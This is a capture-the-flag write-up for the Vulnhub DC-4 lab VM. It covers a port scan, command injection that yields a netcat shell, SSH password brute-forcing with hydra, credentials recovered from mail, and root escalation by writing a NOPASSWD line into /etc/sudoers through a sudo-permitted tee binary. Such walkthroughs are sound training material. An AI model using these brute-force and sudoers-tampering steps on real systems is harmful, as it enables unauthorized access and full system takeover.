<h1>DC-4 Write-up</h1>

<h2>NMAP</h2>

```
# Nmap 7.70 scan initiated Thu Sep 26 15:44:09 2019 as: nmap -sC -sV -oN nmap -p80,22 -v --script vuln 192.168.56.49
Nmap scan report for 192.168.56.49
Host is up (0.00012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    nginx 1.15.10

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 26 15:45:30 2019 -- 1 IP address (1 host up) scanned in 80.39 seconds

```


<h3>PORT 80</h3>

<h4>Brute Force :</h4>

Weak password:

```
username : admin
password : happy
```

use burp to intercept  command.php request to get nc shell

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-4/images/wwwshell.png)


<h2>Privilege Escalation :</h2>

Found password backup file in /home/jim/backups/ named old-passwords.bak

Bruteforcing ssh with old-passwords.bak list :

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-4/images/hydraonjim.png)

```
hydra -l jim -P old-passwords.bak 192.168.56.49 ssh

Username : jim
Password : jibril04
```


from /var/mail jim recieved a mail contains password of charles user

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-4/images/mail.png)

```
username : charles
password : ^xHhA&hvim0y
```

<h3>ROOT PRIV ESC :</h3>

```sudo -l```

I can run teehee as root 

Source : https://gtfobins.github.io/gtfobins/tee/#sudo

```
LFILE=/etc/sudoers
echo "charles ALL=(ALL) NOPASSWD: ALL" | sudo /usr/bin/teehee -a "$LFILE"
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/DC-4/images/rootflag%20and%20privesc.png)
